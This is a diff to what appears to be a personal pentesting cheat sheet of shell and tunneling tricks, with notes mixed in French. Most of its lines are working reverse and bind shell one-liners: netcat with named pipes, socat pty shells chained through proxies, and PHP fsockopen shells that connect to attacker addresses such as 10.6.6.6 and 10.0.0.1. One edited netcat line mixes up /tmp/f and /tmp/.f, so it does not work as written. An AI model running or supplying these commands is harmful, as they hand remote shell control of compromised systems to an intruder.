@@ -40,7 +40,7 @@ tcpovericmp (https://github.com/Maksadbek/tcpovericmp)
 python-pty-shells
 
 ## udp
-python-pty-shells, udptunnel, pwnat, chownat
+python-pty-shells, ./udptunnel, pwnat, chownat
 
 ## dns
 dnsxss
@@ -61,12 +61,9 @@ sh -c "mkfifo /tmp/.f;nc -lp 4444 </tmp/.f|sh >/tmp/.f 2>&1" #beware not all nc 
 https://github.com/sghctoma/multipass
 
 ## reverse shell
-# netcat without -e (hsc)
-mkfifo /tmp/.f (ou mknod fifo p)
-nc 10.6.6.6 8888 </tmp/.f |sh  >/tmp/.f 2>&1
-
-# netcat without -e (pm)
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+# netcat without
+rm /tmp/f; mkfifo /tmp/f (ou mknod fifo p); nc 10.6.6.6 8888 </tmp/.f |sh  >/tmp/.f 2>&1 #hsc
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f #pm
 
 # telnet (hsc)
 moi: nc -l -p 8888 et nc -l -p 9999
@@ -87,11 +84,11 @@ clt term1: socat tcp-l:8443,fork,reuseaddr proxy:$PROXY_IP:$MYBOX_IP:443,proxypo
 clt term2: while :; do socat exec:'bash -i',pty,stderr,setsid,sigint,sane openssl:127.0.0.1:8443,verify=0; done
 
 # socat pty -> http client -> b64 encryption -> dmz proxy -> http server
-me: server.py
+moi: server.py
 clt: socat exec:'path/to/client.py proxy.dmz 3128 jmpbox.com 443' exec:'bash -i',pty,stderr,setsid,sigint,sane,echo=0
 
 # bash pty > http client -> b64 encryption -> dmz proxy -> http server
-me: server.py
+moi: server.py
 clt: ./client.py 192.168.122.1 3128 10.6.6.6 443 < f | bash -i &>f
 
 # nc-like with pty
@@ -143,7 +140,7 @@ perl -e "use IO::Socket; socket(SOCK, PF_INET, SOCK_STREAM,\
 # php
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' #pm
 
-$ php -r '$socket = fsockopen("10.6.6.6",8888,$errno,$errstr,10);\
+php -r '$socket = fsockopen("10.6.6.6",8888,$errno,$errstr,10);\
   $descriptorspec = array(0 => array("pipe", "r"), 1=> array("pipe", "w"),\
   2 => array("pipe", "r"));\
   $process = proc_open("/bin/sh", $descriptorspec, $pipes);\
